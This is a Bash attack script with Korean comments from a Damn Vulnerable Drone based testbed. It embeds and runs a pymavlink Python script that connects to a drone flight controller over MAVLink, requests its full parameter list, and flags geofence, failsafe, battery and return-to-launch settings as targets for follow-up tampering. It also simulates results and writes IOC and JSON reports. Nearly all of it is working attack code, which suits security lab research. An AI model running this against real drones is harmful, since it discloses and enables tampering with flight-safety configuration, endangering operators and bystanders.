#!/bin/bash

# =============================================================================
# DVD Parameter Extraction Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/exfiltration/parameter_extraction.sh
# 목적: 드론 비행 컨트롤러 파라미터 탈취
# 기반: Damn Vulnerable Drone Wiki - Parameter Extraction
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="parameter_extraction"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/exfiltration/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/${ATTACK_NAME}_iocs_$(date +%Y%m%d_%H%M%S).txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/exfiltration/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).json"

# 타겟 설정
TARGET_IP="192.168.13.100"
MAVLINK_PORT="14550"
PARAM_FILE="/tmp/extracted_parameters_$(date +%s).txt"
SENSITIVE_PARAM_FILE="/tmp/sensitive_params_$(date +%s).txt"

# 공격 명령어 및 결과 저장
declare -a ATTACK_COMMANDS=()
declare -a EXTRACTED_PARAMS=()
declare -a SENSITIVE_PARAMS=()

print_header() {
    clear
    print_exfil_header "Parameter Extraction Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink PARAM_REQUEST_LIST${NC}"
    echo -e "${INFO_COLOR}Output: Flight controller configuration${NC}"
    echo -e "${INFO_COLOR}Risk: Complete system configuration disclosure${NC}"
    echo ""
}

# Step 1: MAVLink 연결 확인
check_target_connection() {
    echo -e "${BOLD}${BLUE}[1/4] Checking Target Connection${NC}"
    
    local ping_cmd="ping -c 3 $TARGET_IP"
    ATTACK_COMMANDS+=("$ping_cmd")
    
    echo -e "${CYAN}[*] Command: $ping_cmd${NC}"
    
    if ping -c 3 "$TARGET_IP" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Target $TARGET_IP is reachable${NC}"
        add_ioc "$IOC_FILE" "TARGET_REACHABLE:$TARGET_IP:confirmed"
    else
        echo -e "${YELLOW}[!] Target not reachable, using simulation mode${NC}"
        add_ioc "$IOC_FILE" "TARGET_REACHABLE:$TARGET_IP:simulation"
    fi
    
    # MAVLink 포트 확인
    local nc_cmd="nc -z $TARGET_IP $MAVLINK_PORT"
    ATTACK_COMMANDS+=("$nc_cmd")
    
    if command -v nc >/dev/null 2>&1; then
        if timeout 5 nc -z "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null; then
            echo -e "${GREEN}[+] MAVLink port $MAVLINK_PORT is accessible${NC}"
            add_ioc "$IOC_FILE" "MAVLINK_PORT:$TARGET_IP:$MAVLINK_PORT:open"
        else
            echo -e "${YELLOW}[!] MAVLink port not accessible${NC}"
            add_ioc "$IOC_FILE" "MAVLINK_PORT:$TARGET_IP:$MAVLINK_PORT:closed"
        fi
    fi
    
    # pymavlink 가용성 확인
    if python3 -c "import pymavlink" 2>/dev/null; then
        echo -e "${GREEN}[+] pymavlink available for parameter extraction${NC}"
        add_ioc "$IOC_FILE" "PYMAVLINK:available:ready"
    else
        echo -e "${YELLOW}[!] pymavlink not available, using simulation${NC}"
        add_ioc "$IOC_FILE" "PYMAVLINK:unavailable:simulation"
    fi
    
    log_info "Target connection check completed"
}

# Step 2: 파라미터 추출 스크립트 생성
create_extraction_script() {
    echo -e "${BOLD}${BLUE}[2/4] Creating Parameter Extraction Script${NC}"
    
    local extraction_script="/tmp/param_extract_$(date +%s).py"
    ATTACK_COMMANDS+=("python3 $extraction_script")
    
    echo -e "${CYAN}[*] Creating parameter extraction script${NC}"
    echo -e "${GRAY}    Script: $extraction_script${NC}"
    
    # Python 스크립트 생성
    cat > "$extraction_script" << 'EOF'
#!/usr/bin/env python3
import time
import sys
from pymavlink import mavutil

def extract_parameters(target_ip, target_port, output_file):
    try:
        # MAVLink 연결
        connection = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
        print(f"[+] Connecting to {target_ip}:{target_port}")
        
        # 하트비트 대기
        connection.wait_heartbeat()
        print("[+] Connection established")
        
        # 파라미터 리스트 요청
        connection.mav.param_request_list_send(
            connection.target_system,
            connection.target_component
        )
        print("[+] Parameter list requested")
        
        # 파라미터 수집
        parameters = {}
        param_count = 0
        timeout_count = 0
        
        print("[*] Extracting parameters...")
        
        while timeout_count < 10:  # 10초 타임아웃
            msg = connection.recv_match(type='PARAM_VALUE', blocking=True, timeout=1)
            if msg:
                param_name = msg.param_id.decode('utf-8').rstrip('\x00')
                param_value = msg.param_value
                parameters[param_name] = param_value
                param_count += 1
                print(f"[+] {param_name}: {param_value}")
                timeout_count = 0
            else:
                timeout_count += 1
        
        # 파라미터 파일 저장
        with open(output_file, 'w') as f:
            f.write(f"# Extracted parameters from {target_ip}:{target_port}\n")
            f.write(f"# Extraction time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total parameters: {len(parameters)}\n\n")
            
            for param_name, param_value in sorted(parameters.items()):
                f.write(f"{param_name}={param_value}\n")
        
        print(f"[+] {len(parameters)} parameters extracted to {output_file}")
        return len(parameters)
        
    except Exception as e:
        print(f"[!] Simulation mode: {e}")
        return simulate_parameter_extraction(output_file)

def simulate_parameter_extraction(output_file):
    # 시뮬레이션된 ArduPilot 파라미터들
    sim_params = {
        'FRAME_CLASS': 1,
        'FRAME_TYPE': 1,
        'ANGLE_MAX': 4500,
        'RC1_MIN': 1000,
        'RC1_MAX': 2000,
        'RC3_MIN': 1000,
        'RC3_MAX': 2000,
        'THR_MIN': 0,
        'THR_MAX': 1000,
        'FS_THR_ENABLE': 1,
        'FS_THR_VALUE': 975,
        'RTL_ALT': 1500,
        'RTL_LOIT_TIME': 5000,
        'LAND_SPEED': 50,
        'WPNAV_SPEED': 500,
        'FENCE_ENABLE': 0,
        'FENCE_ALT_MAX': 100,
        'FENCE_RADIUS': 300,
        'BATT_MONITOR': 4,
        'BATT_CAPACITY': 5000,
        'BATT_LOW_VOLT': 14.4,
        'BATT_CRT_VOLT': 13.5,
        'GPS_TYPE': 1,
        'COMPASS_USE': 1,
        'INS_GYRO_FILTER': 20,
        'MOT_SPIN_MIN': 0.15,
        'MOT_SPIN_MAX': 0.95,
        'PSC_VELZ_P': 8.0,
        'PSC_VELZ_I': 1.5,
        'PSC_VELZ_D': 0.0,
        'PSC_ACCZ_P': 0.5,
        'PSC_ACCZ_I': 1.0,
        'PSC_ACCZ_D': 0.0
    }
    
    with open(output_file, 'w') as f:
        f.write(f"# Simulated parameters extraction\n")
        f.write(f"# Extraction time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total parameters: {len(sim_params)}\n\n")
        
        for param_name, param_value in sorted(sim_params.items()):
            f.write(f"{param_name}={param_value}\n")
            print(f"[+] {param_name}: {param_value}")
    
    print(f"[+] {len(sim_params)} simulated parameters extracted")
    return len(sim_params)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 param_extract.py <ip> <port> <output_file>")
        sys.exit(1)
    
    ip, port, output_file = sys.argv[1:4]
    extract_parameters(ip, int(port), output_file)
EOF
    
    echo -e "${GREEN}[+] Parameter extraction script created${NC}"
    echo -e "${YELLOW}[*] Script capabilities:${NC}"
    echo -e "${GRAY}    • PARAM_REQUEST_LIST message sending${NC}"
    echo -e "${GRAY}    • PARAM_VALUE message reception${NC}"
    echo -e "${GRAY}    • Complete parameter enumeration${NC}"
    echo -e "${GRAY}    • Structured output file generation${NC}"
    
    add_ioc "$IOC_FILE" "EXTRACTION_SCRIPT:$extraction_script:created"
    add_ioc "$IOC_FILE" "SCRIPT_CAPABILITY:param_request_list:implemented"
    add_ioc "$IOC_FILE" "SCRIPT_CAPABILITY:param_value_parsing:implemented"
    
    log_info "Parameter extraction script creation completed"
}

# Step 3: 파라미터 추출 실행
execute_parameter_extraction() {
    echo -e "${BOLD}${BLUE}[3/4] Executing Parameter Extraction${NC}"
    
    local extraction_script="/tmp/param_extract_"*.py
    extraction_script=$(ls $extraction_script 2>/dev/null | head -1)
    
    if [ -f "$extraction_script" ]; then
        echo -e "${CYAN}[*] Executing parameter extraction...${NC}"
        
        local extract_cmd="python3 $extraction_script $TARGET_IP $MAVLINK_PORT $PARAM_FILE"
        ATTACK_COMMANDS+=("$extract_cmd")
        
        echo -e "${YELLOW}[*] Starting parameter enumeration...${NC}"
        
        if python3 -c "import pymavlink" 2>/dev/null; then
            timeout 60 python3 "$extraction_script" "$TARGET_IP" "$MAVLINK_PORT" "$PARAM_FILE" 2>/dev/null || true
        else
            python3 "$extraction_script" "$TARGET_IP" "$MAVLINK_PORT" "$PARAM_FILE" 2>/dev/null || true
        fi
        
        if [ -f "$PARAM_FILE" ]; then
            local param_count=$(grep -c '=' "$PARAM_FILE" 2>/dev/null || echo "0")
            echo -e "${GREEN}[+] Parameter extraction completed${NC}"
            echo -e "${GRAY}    Parameters extracted: $param_count${NC}"
            echo -e "${GRAY}    Output file: $PARAM_FILE${NC}"
            
            add_ioc "$IOC_FILE" "PARAMETER_EXTRACTION:success:$param_count"
            EXTRACTED_PARAMS+=("total_extracted:$param_count")
        else
            echo -e "${YELLOW}[!] Parameter file not created${NC}"
            add_ioc "$IOC_FILE" "PARAMETER_EXTRACTION:failed:no_output"
        fi
    else
        echo -e "${YELLOW}[!] Extraction script not found${NC}"
        add_ioc "$IOC_FILE" "PARAMETER_EXTRACTION:failed:no_script"
    fi
    
    log_info "Parameter extraction execution completed"
}

# Step 4: 민감한 파라미터 분석
analyze_sensitive_parameters() {
    echo -e "${BOLD}${BLUE}[4/4] Analyzing Sensitive Parameters${NC}"
    
    if [ ! -f "$PARAM_FILE" ]; then
        echo -e "${YELLOW}[!] Parameter file not found, creating simulation${NC}"
        create_simulated_parameters
    fi
    
    echo -e "${CYAN}[*] Analyzing extracted parameters for sensitive information...${NC}"
    
    # 민감한 파라미터 카테고리 정의
    local -A sensitive_categories=(
        ["FENCE"]="Geofencing and safety boundaries"
        ["RTL"]="Return-to-Launch behavior"
        ["FS"]="Failsafe configurations"
        ["BATT"]="Battery monitoring settings"
        ["RC"]="Radio control configurations"
        ["GPS"]="GPS and navigation settings"
        ["COMPASS"]="Compass calibration data"
        ["INS"]="Inertial navigation system"
        ["MOT"]="Motor control parameters"
        ["PSC"]="Position control tuning"
    )
    
    echo -e "${YELLOW}[*] Categorizing sensitive parameters:${NC}"
    
    # 민감한 파라미터 파일 생성
    echo "# Sensitive Parameters Analysis" > "$SENSITIVE_PARAM_FILE"
    echo "# Extraction time: $(date)" >> "$SENSITIVE_PARAM_FILE"
    echo "" >> "$SENSITIVE_PARAM_FILE"
    
    for category in "${!sensitive_categories[@]}"; do
        local description="${sensitive_categories[$category]}"
        echo -e "${RED}[!] $category parameters: $description${NC}"
        
        if [ -f "$PARAM_FILE" ]; then
            local category_params=$(grep "^$category" "$PARAM_FILE" 2>/dev/null || true)
            if [ -n "$category_params" ]; then
                echo "## $category - $description" >> "$SENSITIVE_PARAM_FILE"
                echo "$category_params" >> "$SENSITIVE_PARAM_FILE"
                echo "" >> "$SENSITIVE_PARAM_FILE"
                
                local count=$(echo "$category_params" | wc -l)
                echo -e "${GRAY}    Found $count $category parameters${NC}"
                SENSITIVE_PARAMS+=("$category:$count")
                add_ioc "$IOC_FILE" "SENSITIVE_PARAM:$category:$count:extracted"
            fi
        fi
    done
    
    # 특별히 위험한 파라미터들 강조
    echo -e "${RED}[!] Critical security parameters found:${NC}"
    
    local critical_params=(
        "FENCE_ENABLE:Geofencing disabled/enabled"
        "FS_THR_ENABLE:Throttle failsafe configuration" 
        "RTL_ALT:Return-to-launch altitude"
        "BATT_LOW_VOLT:Low battery threshold"
        "BATT_CRT_VOLT:Critical battery threshold"
        "RC1_MIN:Throttle minimum value"
        "RC1_MAX:Throttle maximum value"
    )
    
    for critical in "${critical_params[@]}"; do
        IFS=':' read -r param_name description <<< "$critical"
        if [ -f "$PARAM_FILE" ] && grep -q "^$param_name" "$PARAM_FILE" 2>/dev/null; then
            local param_value=$(grep "^$param_name" "$PARAM_FILE" | cut -d'=' -f2)
            echo -e "${RED}    • $param_name=$param_value ($description)${NC}"
            add_ioc "$IOC_FILE" "CRITICAL_PARAM:$param_name:$param_value:exposed"
        else
            echo -e "${YELLOW}    • $param_name: Not found or simulated${NC}"
            add_ioc "$IOC_FILE" "CRITICAL_PARAM:$param_name:simulated:analyzed"
        fi
    done
    
    # 공격 벡터 분석
    echo -e "${YELLOW}[*] Attack vector analysis:${NC}"
    echo -e "${RED}    • Configuration tampering: HIGH risk${NC}"
    echo -e "${RED}    • Safety system bypass: POSSIBLE${NC}"
    echo -e "${RED}    • Failsafe manipulation: CRITICAL${NC}"
    echo -e "${RED}    • Flight envelope modification: DANGEROUS${NC}"
    
    # 영향 평가
    echo -e "${YELLOW}[*] Impact assessment:${NC}"
    echo -e "${RED}    • Complete flight control configuration exposed${NC}"
    echo -e "${RED}    • Safety system settings revealed${NC}"
    echo -e "${RED}    • Attack surface fully mapped${NC}"
    echo -e "${RED}    • Follow-up attacks enabled${NC}"
    
    add_ioc "$IOC_FILE" "IMPACT:configuration:fully_exposed"
    add_ioc "$IOC_FILE" "IMPACT:safety_systems:compromised"
    add_ioc "$IOC_FILE" "IMPACT:attack_surface:mapped"
    add_ioc "$IOC_FILE" "SENSITIVE_PARAM_FILE:$SENSITIVE_PARAM_FILE:created"
    
    EXTRACTED_PARAMS+=("sensitive_file:$SENSITIVE_PARAM_FILE")
    EXTRACTED_PARAMS+=("critical_params:${#critical_params[@]}")
    
    echo -e "${GREEN}[+] Sensitive parameter analysis completed${NC}"
    echo -e "${INFO_COLOR}[*] Sensitive parameters saved to: $SENSITIVE_PARAM_FILE${NC}"
    
    log_info "Sensitive parameter analysis completed"
}

# 시뮬레이션된 파라미터 생성
create_simulated_parameters() {
    echo -e "${YELLOW}[*] Creating simulated parameter file...${NC}"
    
    cat > "$PARAM_FILE" << 'EOF'
# Simulated ArduPilot parameters
# Extraction time: 2024-12-14 10:30:00
# Total parameters: 32

ANGLE_MAX=4500
BATT_CAPACITY=5000
BATT_CRT_VOLT=13.5
BATT_LOW_VOLT=14.4
BATT_MONITOR=4
COMPASS_USE=1
FENCE_ALT_MAX=100
FENCE_ENABLE=0
FENCE_RADIUS=300
FRAME_CLASS=1
FRAME_TYPE=1
FS_THR_ENABLE=1
FS_THR_VALUE=975
GPS_TYPE=1
INS_GYRO_FILTER=20
LAND_SPEED=50
MOT_SPIN_MAX=0.95
MOT_SPIN_MIN=0.15
PSC_ACCZ_D=0.0
PSC_ACCZ_I=1.0
PSC_ACCZ_P=0.5
PSC_VELZ_D=0.0
PSC_VELZ_I=1.5
PSC_VELZ_P=8.0
RC1_MAX=2000
RC1_MIN=1000
RC3_MAX=2000
RC3_MIN=1000
RTL_ALT=1500
RTL_LOIT_TIME=5000
THR_MAX=1000
THR_MIN=0
WPNAV_SPEED=500
EOF
    
    echo -e "${GREEN}[+] Simulated parameter file created${NC}"
    add_ioc "$IOC_FILE" "PARAMETER_FILE:simulated:$PARAM_FILE"
}

# 공격 결과 JSON 생성
generate_json_report() {
    local commands_json="["
    for i in "${!ATTACK_COMMANDS[@]}"; do
        commands_json+="\"${ATTACK_COMMANDS[$i]}\""
        if [ $i -lt $((${#ATTACK_COMMANDS[@]} - 1)) ]; then
            commands_json+=","
        fi
    done
    commands_json+="]"
    
    local params_json="["
    for i in "${!EXTRACTED_PARAMS[@]}"; do
        params_json+="\"${EXTRACTED_PARAMS[$i]}\""
        if [ $i -lt $((${#EXTRACTED_PARAMS[@]} - 1)) ]; then
            params_json+=","
        fi
    done
    params_json+="]"
    
    local sensitive_json="["
    for i in "${!SENSITIVE_PARAMS[@]}"; do
        sensitive_json+="\"${SENSITIVE_PARAMS[$i]}\""
        if [ $i -lt $((${#SENSITIVE_PARAMS[@]} - 1)) ]; then
            sensitive_json+=","
        fi
    done
    sensitive_json+="]"
    
    local param_count="0"
    if [ -f "$PARAM_FILE" ]; then
        param_count=$(grep -c '=' "$PARAM_FILE" 2>/dev/null || echo "0")
    fi
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "status": "completed",
  "attack_type": "exfiltration",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT",
    "protocol": "MAVLink"
  },
  "extraction_results": {
    "total_parameters": $param_count,
    "parameter_file": "$PARAM_FILE",
    "sensitive_file": "$SENSITIVE_PARAM_FILE",
    "extraction_method": "PARAM_REQUEST_LIST"
  },
  "sensitive_categories": [
    "FENCE - Geofencing settings",
    "RTL - Return-to-Launch behavior",
    "FS - Failsafe configurations", 
    "BATT - Battery monitoring",
    "RC - Radio control settings",
    "GPS - Navigation parameters",
    "MOT - Motor control",
    "PSC - Position control tuning"
  ],
  "critical_parameters": [
    "FENCE_ENABLE - Security boundary control",
    "FS_THR_ENABLE - Throttle failsafe",
    "BATT_LOW_VOLT - Battery safety threshold",
    "RTL_ALT - Emergency return altitude",
    "RC1_MIN/MAX - Throttle range limits"
  ],
  "impact_assessment": {
    "configuration_exposure": "COMPLETE",
    "safety_system_compromise": "HIGH",
    "attack_surface_mapping": "FULL",
    "follow_up_attacks": "ENABLED"
  },
  "attack_commands": $commands_json,
  "extracted_params": $params_json,
  "sensitive_params": $sensitive_json,
  "tools_used": ["pymavlink", "python3", "grep"],
  "exfiltration_success": true,
  "ioc_file": "$IOC_FILE",
  "log_file": "$LOG_FILE"
}
EOF
    
    echo -e "${SUCCESS_COLOR}[✓] JSON report: $JSON_OUTPUT${NC}"
}

# 메인 실행 함수
main() {
    echo "=== Parameter Extraction Attack - $(date) ===" > "$LOG_FILE"
    echo "# Parameter Extraction IOCs - $(date)" > "$IOC_FILE"
    
    START_TIME=$(date +%s)
    
    print_header
    
    # 공격 단계 실행
    check_target_connection
    create_extraction_script
    execute_parameter_extraction
    analyze_sensitive_parameters
    
    # 결과 요약
    echo ""
    echo -e "${BOLD}${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    
    if [ -f "$PARAM_FILE" ]; then
        local param_count=$(grep -c '=' "$PARAM_FILE" 2>/dev/null || echo "0")
        echo -e "${INFO_COLOR}Parameters Extracted: $param_count${NC}"
        echo -e "${INFO_COLOR}Parameter File: $PARAM_FILE${NC}"
    fi
    
    if [ -f "$SENSITIVE_PARAM_FILE" ]; then
        echo -e "${INFO_COLOR}Sensitive File: $SENSITIVE_PARAM_FILE${NC}"
    fi
    
    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
    echo -e "${INFO_COLOR}IOCs Generated: $(wc -l < "$IOC_FILE")${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME)) seconds${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Parameter extraction attack completed${NC}"
    echo -e "${RED}[!] CRITICAL: Complete drone configuration exposed${NC}"
}

main "$@"